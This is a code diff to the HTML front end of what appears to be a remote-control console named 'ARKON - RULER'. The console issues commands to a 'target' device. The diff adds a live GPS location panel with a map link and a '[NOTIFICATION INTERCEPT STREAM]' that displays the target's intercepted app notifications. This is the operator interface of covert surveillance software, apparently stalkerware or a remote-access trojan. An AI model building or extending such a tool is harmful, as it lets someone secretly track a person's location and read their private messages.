@@ -4,7 +4,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>ARKON // RULER</title>
+    <title>ARKON - RULER</title>
     <style>
         :root {
             --neon: #00ff41;
@@ -145,6 +145,16 @@
     <input type="text" id="speak_input" placeholder="Enter text to speak..." onchange="sendInput('SPEAK', this.value)">
     <input type="text" id="open_input" placeholder="Enter URL..." onchange="sendInput('OPEN', this.value)">
 
+    <div id="location-box" style="margin: 20px 0; border: 1px dashed var(--neon); padding: 10px;">
+        <a id="maps-link" href="#" target="_blank" style="color: var(--neon); text-decoration: none;">[NO GPS DATA]</a>
+    </div>
+
+    <div id="notifications"
+        style="border: 1px solid #333; padding: 10px; height: 150px; overflow-y: scroll; text-align: left; margin-bottom: 20px;">
+        <div style="border-bottom: 1px solid #333; color: #666; font-size: 0.8rem;">[NOTIFICATION INTERCEPT STREAM]
+        </div>
+    </div>
+
     <div id="terminal"></div>
 
     <script src="/socket.io/socket.io.js"></script>
@@ -177,6 +187,23 @@
             statusEl.innerText = state === 'ONLINE' ? '[TARGET ACQUIRED]' : '[TARGET LOST]';
             statusEl.style.color = state === 'ONLINE' ? '#00ff41' : '#ff0055';
             log(`System status: ${state}`);
+        });
+
+        socket.on('gps', (data) => {
+            const link = document.getElementById('maps-link');
+            link.href = `https://www.google.com/maps?q=${data.lat},${data.lon}`;
+            link.innerText = `[LOC] ${data.lat}, ${data.lon}`;
+            log(`GPS UPDATE: ${data.lat}, ${data.lon}`);
+        });
+
+        socket.on('notification', (data) => {
+            const container = document.getElementById('notifications');
+            const entry = document.createElement('div');
+            entry.style.borderBottom = '1px solid #333';
+            entry.style.padding = '5px 0';
+            entry.innerText = `[${data.app}] ${data.title}: ${data.text}`;
+            container.appendChild(entry);
+            container.scrollTop = container.scrollHeight;
         });
 
         function cmd(action) {
